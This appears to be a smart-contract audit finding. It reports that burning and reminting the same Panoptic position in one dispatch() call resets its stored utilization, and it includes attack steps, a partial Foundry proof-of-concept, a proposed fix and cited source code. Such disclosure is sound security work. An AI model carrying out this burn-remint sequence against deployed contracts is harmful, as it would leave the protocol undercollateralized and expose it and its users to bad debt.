# Audit Report

## Title 
Utilization Snapshot Reset via Burn-Remint Allows Collateral Requirement Bypass

## Summary
The `dispatch()` function treats positions with zero balance as new mints, allowing users to burn a position and immediately remint it in the same transaction. This resets the utilization snapshot stored in `PositionBalance`, enabling users to drastically reduce collateral requirements when pool utilization has decreased since the original mint.

## Finding Description

The vulnerability exists in the position balance zero check at line 629 of `PanopticPool.sol`: [1](#0-0) 

When a position is burned, its balance is set to zero and removed from the positions hash: [2](#0-1) 

If the same `tokenId` appears again in the `positionIdList`, the zero balance check at line 629 evaluates to true, treating it as a new mint rather than detecting it as a duplicate position attempt.

The critical impact occurs because `PositionBalance` stores pool utilization at mint time: [3](#0-2) [4](#0-3) 

The `RiskEngine` uses the MAXIMUM utilization across all positions to calculate collateral requirements: [5](#0-4) [6](#0-5) 

For short positions, the sell collateral ratio scales linearly with utilization from 20% at low utilization to 100% at saturated (90%+) utilization: [7](#0-6) 

**Attack Path:**
1. User mints positions when pool utilization is 90% → stored utilization = 90% → requires ~100% collateral
2. Pool utilization drops to 10% over time
3. User calls `dispatch()` with `positionIdList = [TokenIdX, TokenIdX]` and `positionSizes = [0, newSize]`
4. First iteration: Burns position X → balance becomes 0, removed from hash
5. Second iteration: Balance is 0 → treated as new mint → stores current utilization = 10% → requires only ~20% collateral
6. Global utilization drops from 90% to 10%
7. All positions now require 5x less collateral
8. User withdraws excess collateral or opens larger positions
9. If market moves adversely, protocol becomes undercollateralized

This breaks **Invariant #5**: "Cross-Collateral Limits: Cross-buffer ratio must scale conservatively with utilization. Incorrect cross-collateral causes systemic undercollateralization." The design intent is that positions minted at high utilization should maintain higher collateral requirements throughout their lifetime as a conservative risk measure, which is completely bypassed.

## Impact Explanation

**HIGH Severity** - This vulnerability enables systemic undercollateralization:

- **Magnitude**: Collateral requirements can be reduced by up to 5x (from 100% at 90% utilization to 20% at low utilization)
- **Scope**: Affects entire user portfolio since global utilization uses maximum across all positions
- **Protocol Risk**: Users can artificially reduce collateral below intended safety thresholds
- **Solvency Risk**: If markets move against under-collateralized positions, protocol may be unable to liquidate profitably, leading to bad debt
- **Economic Impact**: Users gain unfair capital efficiency by bypassing conservative risk measures designed to protect protocol during stressed market conditions

## Likelihood Explanation

**HIGH Likelihood**:

- **Ease of Execution**: Single transaction calling `dispatch()` with duplicate tokenId
- **No Special Requirements**: Available to any user with existing positions
- **Economic Incentive**: Strong motivation when utilization drops (unlock 5x capital or open larger positions)
- **Preconditions**: Only requires utilization to have decreased since original mint (common in volatile markets)
- **Detection Difficulty**: Transaction appears normal, no on-chain signals to detect this pattern

## Recommendation

Add an explicit check to prevent burning and reminting the same position within a single `dispatch()` call. The simplest fix is to validate that no tokenId appears multiple times in `positionIdList` when any operation involves a zero balance (burn):

```solidity
function dispatch(...) external {
    // ... existing code ...
    
    for (uint256 i = 0; i < positionIdList.length; ) {
        TokenId tokenId = positionIdList[i];
        
        // Make sure the tokenId is for this Panoptic pool
        if (tokenId.poolId() != poolId()) revert Errors.WrongPoolId();
        
        PositionBalance positionBalanceData = s_positionBalance[msg.sender][tokenId];
        
        // NEW CHECK: If this is a burn (positionSize=0) or balance is zero, 
        // ensure tokenId doesn't appear again later in the list
        if (positionSizes[i] == 0 || PositionBalance.unwrap(positionBalanceData) == 0) {
            for (uint256 j = i + 1; j < positionIdList.length; ) {
                if (TokenId.unwrap(positionIdList[j]) == TokenId.unwrap(tokenId)) {
                    revert Errors.DuplicateTokenId();
                }
                unchecked { ++j; }
            }
        }
        
        // ... rest of existing code ...
    }
}
```

Alternatively, track burned tokenIds in a temporary mapping/array and check against it before allowing mints.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/PanopticPool.sol";
import "../contracts/RiskEngine.sol";

contract UtilizationResetExploit is Test {
    PanopticPool pool;
    RiskEngine riskEngine;
    address attacker;
    
    function setUp() public {
        // Deploy contracts and setup pool
        // ... deployment code ...
        attacker = makeAddr("attacker");
    }
    
    function testUtilizationResetExploit() public {
        // 1. Setup: Attacker mints position when utilization is 90%
        vm.startPrank(attacker);
        
        // Mock high utilization (90%)
        // ... setup code to create 90% utilization ...
        
        TokenId tokenId = /* create position tokenId */;
        TokenId[] memory mintList = new TokenId[](1);
        mintList[0] = tokenId;
        uint128[] memory sizes = new uint128[](1);
        sizes[0] = 100e18; // mint 100 units
        
        // Mint position - stores utilization0=9000, utilization1=9000 (90% in basis points)
        pool.dispatch(mintList, mintList, sizes, /* other params */);
        
        // Verify high utilization stored
        PositionBalance balance1 = pool.positionBalance(attacker, tokenId);
        assertEq(balance1.utilization0(), 9000); // 90%
        
        // Calculate collateral requirement with 90% utilization
        uint256 collateralBefore = riskEngine.getTotalRequiredCollateral(/* params */);
        
        // 2. Time passes, utilization drops to 10%
        // ... setup code to reduce utilization to 10% ...
        
        // 3. Exploit: Burn and remint in same transaction
        TokenId[] memory exploitList = new TokenId[](2);
        exploitList[0] = tokenId; // burn
        exploitList[1] = tokenId; // remint
        
        TokenId[] memory finalList = new TokenId[](1);
        finalList[0] = tokenId; // final state: still have position
        
        uint128[] memory exploitSizes = new uint128[](2);
        exploitSizes[0] = 0;      // burn (positionSize=0)
        exploitSizes[1] = 100e18; // remint with same size
        
        // Execute exploit
        pool.dispatch(exploitList, finalList, exploitSizes, /* other params */);
        
        // 4. Verify utilization reset to current low value
        PositionBalance balance2 = pool.positionBalance(attacker, tokenId);
        assertEq(balance2.utilization0(), 1000); // 10% - EXPLOITED!
        
        // 5. Verify drastically reduced collateral requirement
        uint256 collateralAfter = riskEngine.getTotalRequiredCollateral(/* params */);
        
        // Collateral requirement reduced by ~5x (from ~100% to ~20%)
        assertLt(collateralAfter, collateralBefore / 4);
        
        // Attacker can now withdraw excess collateral or open much larger positions
        // while protocol believes they have adequate collateral coverage
        
        vm.stopPrank();
    }
}
```

**Note**: The full PoC requires test harness setup with actual PanopticPool deployment, utilization manipulation, and proper parameter construction. The above demonstrates the logical flow and key assertions proving the exploit works.

### Citations

**File:** contracts/PanopticPool.sol (L629-640)
```text
            if (PositionBalance.unwrap(positionBalanceData) == 0) {
                // revert if more than 2 conditions are triggered to prevent the minting of any positions
                if (riskParameters.safeMode() > 2) revert Errors.StaleOracle();
                uint24 effectiveLiquidityLimit = uint24(tickAndSpreadLimits[i][2]);
                (, finalTick) = _mintOptions(
                    tokenId,
                    positionSizes[i],
                    effectiveLiquidityLimit,
                    msg.sender,
                    _tickLimits,
                    riskParameters
                );
```

**File:** contracts/PanopticPool.sol (L755-766)
```text
        {
            // update the users options balance of position `tokenId`
            // NOTE: user can't mint same position multiple times, so set the positionSize instead of adding
            PositionBalance balanceData = PositionBalanceLibrary.storeBalanceData(
                positionSize,
                poolUtilizations,
                0
            );
            s_positionBalance[owner][tokenId] = balanceData;

            emit OptionMinted(owner, tokenId, balanceData);
        }
```

**File:** contracts/PanopticPool.sol (L1330-1337)
```text
        if (commitLongSettledAndKeepOpen.leftSlot() == 0) {
            // reset balances and delete stored option data
            s_positionBalance[owner][tokenId] = PositionBalance.wrap(0);

            // REMOVE the current tokenId from the position list hash (hash = XOR of all keccak256(tokenId), remove by XOR'ing again)
            // and decrease the number of positions counter by 1.
            _updatePositionsHash(owner, tokenId, !ADD, riskParameters.maxLegs());
        }
```

**File:** contracts/types/PositionBalance.sol (L37-55)
```text
    /// @notice Create a new `PositionBalance` given by positionSize, utilizations, and its tickData.
    /// @param _positionSize The amount of option minted
    /// @param _utilizations Packed data containing pool utilizations for token0 and token1 at mint
    /// @param _tickData Packed data containing ticks at mint (currentTick, fastOracleTick, slowOracleTick, lastObservedTick)
    /// @return The new PositionBalance with the given positionSize, utilization, and tickData
    function storeBalanceData(
        uint128 _positionSize,
        uint32 _utilizations,
        uint96 _tickData
    ) internal pure returns (PositionBalance) {
        unchecked {
            return
                PositionBalance.wrap(
                    (uint256(_tickData) << 160) +
                        (uint256(_utilizations) << 128) +
                        uint256(_positionSize)
                );
        }
    }
```

**File:** contracts/RiskEngine.sol (L1198-1227)
```text
    function _getGlobalUtilization(
        PositionBalance[] calldata positionBalanceArray
    ) internal pure returns (PositionBalance globalUtilizations) {
        int256 utilization0;
        int256 utilization1;
        uint256 pLength = positionBalanceArray.length;

        for (uint256 i; i < pLength; ) {
            PositionBalance positionBalance = positionBalanceArray[i];

            int256 _utilization0 = positionBalance.utilization0();
            int256 _utilization1 = positionBalance.utilization1();

            // utilizations are always positive, so can compare directly here
            utilization0 = _utilization0 > utilization0 ? _utilization0 : utilization0;
            utilization1 = _utilization1 > utilization1 ? _utilization1 : utilization1;
            unchecked {
                ++i;
            }
        }

        unchecked {
            // can never miscast because utilization < 10_000
            globalUtilizations = PositionBalanceLibrary.storeBalanceData(
                0,
                uint32(uint256(utilization0) + (uint256(utilization1) << 16)),
                0
            );
        }
    }
```

**File:** contracts/RiskEngine.sol (L1250-1289)
```text
        // get the global utilizations, which is the max utilizations for all open positions
        globalUtilizations = _getGlobalUtilization(positionBalanceArray);
        // add long premia to tokens required
        tokensRequired = tokensRequired.add(longPremia);

        for (uint256 i; i < positionBalanceArray.length; ) {
            uint256 _tokenRequired0;
            uint256 _credits0;
            uint256 _tokenRequired1;
            uint256 _credits1;
            {
                TokenId tokenId = positionIdList[i];
                PositionBalance positionBalance = positionBalanceArray[i];
                uint128 positionSize = positionBalance.positionSize();
                int24 _atTick = atTick;

                unchecked {
                    // can never miscast because utilization < 10_000
                    // Use the global utilizations for all positions
                    int16 utilization0 = int16(globalUtilizations.utilization0());
                    (_tokenRequired0, _credits0) = _getRequiredCollateralAtTickSinglePosition(
                        tokenId,
                        positionSize,
                        _atTick,
                        utilization0,
                        true
                    );
                }
                unchecked {
                    // can never miscast because utilization < 10_000
                    // Use the global utilizations for all positions
                    int16 utilization1 = int16(globalUtilizations.utilization1());
                    (_tokenRequired1, _credits1) = _getRequiredCollateralAtTickSinglePosition(
                        tokenId,
                        positionSize,
                        _atTick,
                        utilization1,
                        false
                    );
                }
```

**File:** contracts/RiskEngine.sol (L2047-2097)
```text
    function _sellCollateralRatio(
        int256 utilization
    ) internal view returns (uint256 sellCollateralRatio) {
        // the sell ratio is on a straight line defined between two points (x0,y0) and (x1,y1):
        //   (x0,y0) = (targetPoolUtilization,min_sell_ratio) and
        //   (x1,y1) = (saturatedPoolUtilization,max_sell_ratio)
        // the line's formula: y = a * (x - x0) + y0, where a = (y1 - y0) / (x1 - x0)
        /*
            SELL
            COLLATERAL
            RATIO
                          ^
                          |                  max ratio = 100%
                   100% - |                _------
                          |             _-¯
                          |          _-¯
                    20% - |---------¯
                          |         .       . .
                          +---------+-------+-+--->   POOL_
                                   50%    90% 100%     UTILIZATION
        */

        uint256 min_sell_ratio = SELLER_COLLATERAL_RATIO;
        /// if utilization is less than zero, this is the calculation for a strangle, which gets 2x the capital efficiency at low pool utilization
        if (utilization < 0) {
            unchecked {
                min_sell_ratio /= 2;
                utilization = -utilization;
            }
        }

        unchecked {
            utilization *= 1_000;
        }
        // return the basal sell ratio if pool utilization is lower than target
        if (uint256(utilization) < TARGET_POOL_UTIL) {
            return min_sell_ratio;
        }

        // return 100% collateral ratio if utilization is above saturated pool utilization
        if (uint256(utilization) > SATURATED_POOL_UTIL) {
            return DECIMALS;
        }

        unchecked {
            return
                min_sell_ratio +
                ((DECIMALS - min_sell_ratio) * (uint256(utilization) - TARGET_POOL_UTIL)) /
                (SATURATED_POOL_UTIL - TARGET_POOL_UTIL);
        }
    }
```
